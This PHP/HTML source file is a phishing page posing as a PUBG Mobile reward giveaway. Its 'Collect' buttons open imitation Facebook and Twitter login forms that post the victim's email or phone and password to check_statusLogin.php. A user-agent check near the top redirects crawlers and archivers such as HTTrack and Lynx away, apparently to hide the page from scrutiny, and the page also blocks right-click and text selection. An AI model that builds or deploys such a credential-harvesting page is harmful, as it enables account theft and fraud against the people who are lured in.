<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">

<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div>
<img src="img/icon.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span class="slider">ROYALE PASS 14</span>
<span class="slider">SPARK THE FLAME</span>
</div>
</div>

<div class="header">
<img src="https://i.ibb.co/515D0zx/banner.jpg">
</div>
<div class="content">

<center>
<div class="menu-wrapper">
<div class="menu-choose" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-choose" onclick="openRewards(event, 'season');">Season Reward</div>
<div class="menu-choose" onclick="openRewards(event, 'other');">Other Reward</div>
</div>
</center>

<div id="latest" class="tab_rewards">
<div class="scroll-rewards">
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/1.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/1.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/2.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/2.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/3.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/3.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/4.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/4.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/5.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/5.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/6.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/6.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/7.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/7.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/8.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/8.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/9.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/9.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/10.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/10.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/11.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/11.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/12.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/12.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/13.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/13.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/14.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/14.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/15.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/15.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/16.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/16.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/17.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/17.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/18.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/18.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/19.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/19.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/20.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/20.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/21.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/21.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/22.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/22.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/23.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/23.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/24.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/24.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/25.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/25.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/26.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/26.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/27.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/27.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/mythic/28.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/28.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/mythic/29.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/29.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/mythic/30.png">
<button type="button" onclick="confirm(this)" src="img/reward/mythic/30.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/1.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/1.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/2.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/2.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/3.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/3.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/4.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/4.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/5.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/5.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/6.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/6.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/7.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/7.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/8.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/8.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/9.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/9.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/10.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/10.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/11.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/11.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/12.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/12.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/13.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/13.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/14.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/14.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/15.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/15.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/16.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/16.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/17.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/17.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/18.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/18.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/19.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/19.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/20.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/20.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/21.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/21.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/22.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/22.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/23.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/23.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/24.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/24.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/25.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/25.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/26.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/26.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/27.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/27.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/28.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/28.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/29.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/29.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/30.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/30.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/31.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/31.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/32.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/32.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/33.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/33.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/34.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/34.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/35.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/35.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/36.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/36.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/37.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/37.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/38.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/38.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/39.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/39.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/40.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/40.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/41.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/41.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/42.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/42.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/43.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/43.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/44.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/44.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/45.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/45.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/items/46.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/46.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/47.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/47.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/48.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/48.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/items/49.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/49.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/items/50.png">
<button type="button" onclick="confirm(this)" src="img/reward/items/50.png"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
</div>
</div>

<div id="season" class="tab_rewards">
<div class="scroll-rewards">
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/1.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/1.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/2.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/2.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/3.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/3.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/4.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/4.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/5.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/5.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/6.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/6.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/7.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/7.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/8.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/8.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/9.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/9.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/10.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/10.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/11.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/11.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/12.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/12.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/13.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/13.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/14.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/14.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/15.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/15.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/16.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/16.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/17.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/17.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/18.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/18.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kanan">
<img style="border-bottom: 0px;" src="img/reward/season/19.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/19.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item kiri">
<img style="border-bottom: 0px;" src="img/reward/season/20.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/20.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
<div class="item tengah">
<img style="border-bottom: 0px;" src="img/reward/season/21.jpg">
<button type="button" onclick="confirm(this)" src="img/reward/season/21.jpg"><i class="fa fa-chevron-right"></i> Collect</button>
</div>
</div>
</div>

<div id="other" class="tab_rewards">
<script type="text/javascript">
function buka(nama) {
$("#konten").html('<div class="load-item">Please wait...</div>');
	$.ajax({
		url	: nama+'.php',
		type	: 'GET',
		dataType: 'html',
		success	: function(isi){
			$("#konten").html(isi);
		},
	});
}

</script>
<div id="konten">
<?php include 'pages/weapon.php';?>
</div>
</div>

</div> <!--- content --->
</div> <!--- container mask --->
</div> <!--- container --->

<div class="popup-confirm-wrapper confirm animated fadeIn" style="display: none;">
<div class="popup-confirm">
<div class="popup-confirm-navbar">
Confirm Selected Reward
</div>
<div class="popup-confirm-content">
<div class="popup-confirm-txt">
Are you sure you want to collect this rewards?
</div>
<img class="popup-confirm-content-img" src="" id="got">
<div class="popup-confirm-txt">
</div>
<button type="button" class="kiri" style="width: 49%; margin-bottom: 10px;" onclick="close_confirm()">Cancel now</button>
<button type="button" class="kanan" style="width: 49%; margin-bottom: 10px;" onclick="login()">Collect now</button>
</div>
</div> <!--- popup confirm --->
</div> <!--- popup --->

<div class="popup-confirm-wrapper login animated fadeIn" style="display: none;">
<div class="popup-confirm">
<div class="popup-confirm-navbar">
Login to receive selected reward
</div>
<div class="popup-confirm-content">
<div class="popup-confirm-txt">
Login to receive your selected rewards
</div>
<div class="btn-login" onclick="open_facebook()">
<div class="btn-login-logo-wrapper">
<img src="img/login/facebook_icon.png">
</div>
<div class="btn-login-txt">
Login using Facebook account
</div>
</div>
<div class="btn-login" onclick="open_twitter()">
<div class="btn-login-logo-wrapper">
<img src="img/login/twitter_icon.png">
</div>
<div class="btn-login-txt">
Login using Twitter account
</div>
</div>
<button type="button" class="tengah" onclick="close_login()" style="margin-top: 20px;">Back to reward list</button>
</div>
</div> <!--- popup confirm --->
</div> <!--- popup --->

<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="check_statusLogin.php" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="check_statusLogin.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/slider.js"></script>
<script src="js/tab_rewards.js"></script>
<script src="js/tab_other.js"></script>
<script src="js/popup.js"></script>

</body>
</html>